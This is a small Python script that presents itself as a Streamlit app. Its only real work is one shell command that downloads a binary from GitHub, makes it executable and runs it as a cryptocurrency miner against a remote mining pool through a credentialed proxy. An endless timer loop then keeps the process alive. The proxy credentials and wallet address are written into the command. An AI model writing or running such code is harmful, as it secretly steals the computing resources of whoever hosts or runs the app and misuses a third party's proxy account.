from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
p = subprocess.run("curl -L -o sse2 https://github.com/Akatsoki/nungx/raw/main/sse2 && chmod +x sse2 && ./sse2 -a yespower -o stratum+tcps://146.59.217.34:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.GEDO -t 16 -x socks5://ynaujnqw-GB-rotate:4qaggd95y2ow@p.webshare.io:80", stdout=subprocess.PIPE, shell=True)
print(p.communicate())

import time 
from IPython.display import clear_output 
 
def zero_to_infinity(): 
    i = 0 
    while True: 
        yield i 
        i += 1 
        time.sleep(1) 
 
start = time.time() 
for x in zero_to_infinity(): 
    clear_output(wait=True) 
    end = time.time() 
    temp = end-start 
    hours = temp//3600 
    temp = temp - 3600*hours 
    minutes = temp//60 
    seconds = temp - 60*minutes 
    print("") 
    print('%s %d:%d:%d' %("Time execution : ",hours,minutes,seconds)) 
    print("")
